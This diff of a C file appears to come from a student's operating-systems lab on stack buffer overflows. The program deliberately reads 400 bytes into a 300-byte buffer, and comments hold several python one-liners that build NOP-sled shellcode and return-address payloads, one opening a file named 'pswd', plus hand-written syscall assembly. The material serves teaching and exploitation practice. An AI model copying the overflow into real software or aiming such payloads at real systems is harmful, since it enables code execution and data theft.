@@ -142,7 +142,18 @@
  //   return 1;
  // }
 
-//python -c "print('\x90'*257+'\xE9\x0B\x00\x00\x00\x6A\x02\xCD\x30\x31\xC0\x50\x40\x50\xCD\x30\xE8\xF0\xFF\xFF\xFFcrack\0'+'\x70\xfe\xff\xbf'*25)" > ../userprog/build/shellcode
+
+/* thomas's */
+// python -c "print('\x90'*257+'\xE9\x0B\x00\x00\x00\x6A\x02\xCD\x30\x31\xC0\x50\x40\x50\xCD\x30\xE8\xF0\xFF\xFF\xFFcrack\0'+'\x70\xfe\xff\xbf'*25)" > ../userprog/build/shellcode
+
+/* mine exit */
+// python -c "print('\x90'*250+'\xB8\x01\x00\x00\x00\xBB\x09\x00\x00\x00\x53\x50\xCD\x30'+'\xff\xfe\xff\xbf'*25)" > ../userprog/build/shellcode
+
+/* MY FING WINNING LINE */
+// python -c "print('\x90'*256+'\x6A\x00\x68\x70\x73\x77\x64\x89\xE1\x51\x6A\x05\xCD\x30\x6A\x00\x6A\x01\xCD\x30\x6A\x00\xCD\x30'+'\x70\xfe\xff\xbf'*25)" > ../userprog/build/shellcode
+
+
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -165,19 +176,60 @@ char shellcode[] =
 void getMessage( int file ) {
   char buffer[300];
   // printf( "%s\n", buffer );
-  printf( "func: before: buffer address: %p\n", buffer );
+  // printf( "func: before: buffer address: %p\n", buffer );
   read( file, buffer, 400 );
-  printf( "func: after\n" );
+  // printf( "func: after\n" );
   // printf( "%s\n", buffer );
 }
 
 int main( int argc, char *argv[] ) {
 
   int fd = open( argv[1] );
-  printf( "main: before\n" );
+  // printf( "main: before\n" );
   getMessage( fd );
-  printf( "main: after\n" );
+  // printf( "main: after\n" );
 
   close( fd );
   return 69;
 }
+
+// xorecx, ecx
+// push ecx
+// push 0x64777370
+// push 0x6
+// mov ebx, esp
+// int 0x30
+// mov ebx, eax
+
+// push ebx
+// push 0x6f72676e
+// push 0x4
+// int 0x30
+
+// push ebx
+// push 0xc
+// int 0x30
+
+// push 0x0
+// push 0x1
+// int 0x30
+
+
+// push 0x4
+// push   0x6f72676e
+// push   0x1
+// push   0x9
+// int    0x30
+
+
+// jmp    0x15
+// push   0x5
+// int    0x30
+// xor eax, eax
+// push   eax
+// inc    eax
+// push   eax
+// int    0x30
+// call   0xa
+
+
